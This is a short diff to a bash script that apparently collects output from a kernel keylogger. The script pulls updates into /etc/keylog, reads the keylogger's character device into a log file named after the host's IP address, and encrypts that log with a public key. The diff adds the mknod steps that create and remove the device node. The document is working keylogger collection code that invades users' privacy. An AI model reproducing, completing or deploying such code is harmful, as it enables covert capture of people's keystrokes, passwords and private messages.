@@ -1,5 +1,7 @@
 #!/bin/bash
 
+major=`cat /sys/kernel/debug/keylog/major`
+
 cd /etc/keylog
 git pull
 
@@ -7,7 +9,9 @@ mkdir -p logs
 mkdir -p scripts
 
 ip=`ip route get 8.8.8.8 | grep -oP 'src \K[^ ]+'`
+mknod chrdev0 c $major 0
 cat chrdev0 >> "./logs/$ip.txt"
+rm chrdev0
 
 # encrypt
 openssl rsautl -encrypt -inkey key.pem -pubin -in "logs/$ip.txt" -out "logs/$ip.enc"
